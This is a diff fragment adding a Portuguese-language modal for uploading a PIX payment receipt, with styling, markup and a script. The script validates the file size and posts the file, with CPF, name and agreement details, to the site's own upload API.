+  .cp-drop-sub { font-size: 12px; color: #64748B; margin-top: 2px; font-family: 'Montserrat', Arial, sans-serif; }
+  .cp-status { font-size: 13px; color: #64748B; min-height: 0; margin: 0 0 12px; text-align: center; font-weight: 500; font-family: 'Montserrat', Arial, sans-serif; }
+  .cp-status:empty { display: none; }
+  .cp-status.ok { color: #059669; }
+  .cp-status.err { color: #DC2626; }
+  .cp-submit { width: 100%; padding: 13px; background: #d72a7f; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; font-family: 'Montserrat', Arial, sans-serif; cursor: pointer; transition: background .15s, transform .15s; }
+  .cp-submit:hover:not(:disabled) { background: #b8226b; }
+  .cp-submit:active:not(:disabled) { transform: scale(0.985); }
+  .cp-submit:disabled { background: #CBD5E1; cursor: not-allowed; }
+  .cp-submit.enviado { background: #059669; }
+  .cp-secondary { width: 100%; padding: 12px; margin-top: 10px; background: transparent; color: #475569; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; font-family: 'Montserrat', Arial, sans-serif; cursor: pointer; transition: background .15s; }
+  .cp-secondary:hover { background: #F1F5F9; color: #0F172A; }
+  .cp-already-ic { width: 56px; height: 56px; border-radius: 50%; background: #fce4ee; color: #d72a7f; display: flex; align-items: center; justify-content: center; margin: 8px auto 14px; }
+  #cp-view-already { text-align: center; }
+  #cp-view-already .cp-desc { margin-bottom: 20px; }
+  body.cp-lock { overflow: hidden; }
+  .cp-toast { position: fixed; left: 50%; bottom: 24px; transform: translate(-50%, 24px); background: #0F172A; color: #fff; padding: 10px 16px; border-radius: 999px; font-size: 13px; font-weight: 600; display: flex; align-items: center; gap: 8px; opacity: 0; pointer-events: none; z-index: 10000; box-shadow: 0 12px 32px rgba(15, 23, 42, 0.35); transition: transform .3s cubic-bezier(0.32, 0.72, 0, 1), opacity .3s; max-width: calc(100% - 32px); white-space: nowrap; font-family: 'Montserrat', Arial, sans-serif; }
+  .cp-toast.open { opacity: 1; pointer-events: auto; transform: translate(-50%, 0); }
+  .cp-toast-ic { width: 22px; height: 22px; border-radius: 50%; background: rgba(255,255,255,0.14); color: #f6a5c9; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  @media (min-width: 640px) and (min-height: 560px) {
+    .cp-panel { bottom: 24px; left: 50%; right: auto; transform: translate(-50%, calc(100% + 24px)); border-radius: 18px; width: calc(100% - 32px); max-width: 440px; max-height: calc(100vh - 48px); box-shadow: 0 24px 64px rgba(15, 23, 42, 0.28); padding: 6px 22px 22px; }
+    .cp-sheet.open .cp-panel { transform: translate(-50%, 0); }
+  }
+</style>
+
+<div class="cp-sheet" id="cp-sheet" aria-hidden="true">
+  <div class="cp-backdrop" id="cp-backdrop"></div>
+  <div class="cp-panel" role="dialog" aria-modal="true">
+    <div class="cp-handle" aria-hidden="true"></div>
+    <div class="cp-view" id="cp-view-upload">
+      <h3 class="cp-title">Enviar comprovante do PIX</h3>
+      <p class="cp-desc">Anexe uma imagem (JPG, PNG) ou PDF do comprovante do pagamento. Nossa equipe faz a validacao em instantes.</p>
+      <label class="cp-drop" id="cp-file-label">
+        <input type="file" id="cp-file-input" accept="image/*,application/pdf" hidden>
+        <div class="cp-drop-ic" aria-hidden="true">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v13"/><path d="M7 8l5-5 5 5"/><path d="M4 21h16"/></svg>
+        </div>
+        <div class="cp-drop-txt">
+          <div class="cp-drop-title" id="cp-file-text">Selecionar arquivo</div>
+          <div class="cp-drop-sub">JPG, PNG ou PDF ate 3 MB</div>
+        </div>
+      </label>
+      <div class="cp-status" id="cp-status"></div>
+      <button class="cp-submit" id="cp-submit" disabled>Enviar comprovante</button>
+    </div>
+    <div class="cp-view" id="cp-view-already" hidden>
+      <div class="cp-already-ic" aria-hidden="true">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+      </div>
+      <h3 class="cp-title">Comprovante em analise</h3>
+      <p class="cp-desc">Ja recebemos seu comprovante e ele esta sendo validado pela nossa equipe. Deseja enviar outro?</p>
+      <button class="cp-submit" id="cp-send-another">Sim, enviar outro</button>
+      <button class="cp-secondary" id="cp-cancel-already">Nao, fechar</button>
+    </div>
+  </div>
+</div>
+
+<div class="cp-toast" id="cp-toast" role="status" aria-live="polite">
+  <div class="cp-toast-ic" aria-hidden="true">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+  </div>
+  <span>Comprovante em analise...</span>
+</div>
+
+<script>
+(function(){
+  function init(){
+    var linkBtn = document.getElementById('btn-ja-paguei');
+    var sheet = document.getElementById('cp-sheet');
+    var backdrop = document.getElementById('cp-backdrop');
+    var fileInput = document.getElementById('cp-file-input');
+    var fileLabel = document.getElementById('cp-file-label');
+    var fileText = document.getElementById('cp-file-text');
+    var submitBtn = document.getElementById('cp-submit');
+    var statusEl = document.getElementById('cp-status');
+    var toastEl = document.getElementById('cp-toast');
+    var viewUpload = document.getElementById('cp-view-upload');
+    var viewAlready = document.getElementById('cp-view-already');
+    var sendAnotherBtn = document.getElementById('cp-send-another');
+    var cancelAlreadyBtn = document.getElementById('cp-cancel-already');
+    if (!linkBtn || !sheet) return;
+
+    var arquivo = null;
+    var hasSubmitted = false;
+    var MAX_BYTES = 3 * 1024 * 1024;
+
+    function showUploadView(){ viewAlready.hidden = true; viewUpload.hidden = false; }
+    function showAlreadyView(){ viewUpload.hidden = true; viewAlready.hidden = false; }
+    function openSheet(){
+      if (hasSubmitted) showAlreadyView(); else showUploadView();
+      sheet.classList.add('open');
+      sheet.setAttribute('aria-hidden','false');
+      document.body.classList.add('cp-lock');
+    }
+    function closeSheet(){
+      sheet.classList.remove('open');
+      sheet.setAttribute('aria-hidden','true');
+      document.body.classList.remove('cp-lock');
+      setTimeout(function(){
+        arquivo = null;
+        if (fileInput) fileInput.value = '';
+        if (fileText) fileText.textContent = 'Selecionar arquivo';
+        if (fileLabel) fileLabel.classList.remove('has-file');
+        if (statusEl){ statusEl.textContent = ''; statusEl.className = 'cp-status'; }
+        if (submitBtn){ submitBtn.disabled = true; submitBtn.textContent = 'Enviar comprovante'; submitBtn.classList.remove('enviado'); }
+      }, 320);
+    }
+    function showToast(){
+      if (!toastEl) return;
+      toastEl.classList.add('open');
+      setTimeout(function(){ toastEl.classList.remove('open'); }, 3200);
+    }
+
+    linkBtn.addEventListener('click', function(e){ e.preventDefault(); openSheet(); });
+    backdrop.addEventListener('click', closeSheet);
+    document.addEventListener('keydown', function(e){ if (e.key === 'Escape' && sheet.classList.contains('open')) closeSheet(); });
+    sendAnotherBtn.addEventListener('click', showUploadView);
+    cancelAlreadyBtn.addEventListener('click', closeSheet);
+
+    fileInput.addEventListener('change', function(){
+      var f = fileInput.files && fileInput.files[0];
+      if (!f) return;
+      if (f.size > MAX_BYTES){
+        statusEl.textContent = 'Arquivo maior que 3 MB. Reduza e tente novamente.';
+        statusEl.className = 'cp-status err';
+        arquivo = null;
+        fileText.textContent = 'Selecionar arquivo';
+        fileLabel.classList.remove('has-file');
+        submitBtn.disabled = true;
+        return;
+      }
+      arquivo = f;
+      fileText.textContent = f.name;
+      fileLabel.classList.add('has-file');
+      statusEl.textContent = '';
+      statusEl.className = 'cp-status';
+      submitBtn.disabled = false;
+    });
+
+    submitBtn.addEventListener('click', async function(){
+      if (!arquivo) return;
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Enviando...';
+      statusEl.textContent = '';
+      statusEl.className = 'cp-status';
+      try {
+        var b64 = await new Promise(function(resolve, reject){
+          var fr = new FileReader();
+          fr.onload = function(){
+            var v = String(fr.result || '');
+            var i = v.indexOf(',');
+            resolve(i >= 0 ? v.slice(i + 1) : v);
+          };
+          fr.onerror = function(){ reject(new Error('Falha ao ler arquivo')); };
+          fr.readAsDataURL(arquivo);
+        });
+        var params = new URLSearchParams(window.location.search);
+        var resp = await fetch('/api/upload-comprovante', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            transaction_id: window.__pixTxId || null,
+            cpf: (params.get('cpf') || '').replace(/\D/g,''),
+            nome: params.get('nome') || '',
+            acordo: params.get('acordo') || '',
+            file_name: arquivo.name,
+            mime_type: arquivo.type || 'application/octet-stream',
+            size_bytes: arquivo.size,
+            data_base64: b64
+          })
+        });
+        var out = {};
+        try { out = await resp.json(); } catch(_){}
+        if (!resp.ok || out.error) throw new Error(out.error || 'Falha ao enviar');
+        submitBtn.textContent = 'Comprovante enviado';
+        submitBtn.classList.add('enviado');
+        statusEl.textContent = 'Recebemos seu comprovante. Nao saia desta pagina.';
+        statusEl.className = 'cp-status ok';
+        hasSubmitted = true;
+        setTimeout(function(){ closeSheet(); showToast(); }, 1400);
+      } catch(e){
+        console.error('upload comprovante:', e);
+        statusEl.textContent = 'Nao foi possivel enviar. Tente novamente.';
+        statusEl.className = 'cp-status err';
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Enviar comprovante';
+      }
+    });
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
+})();
+</script>
+</body>
+</html>
+
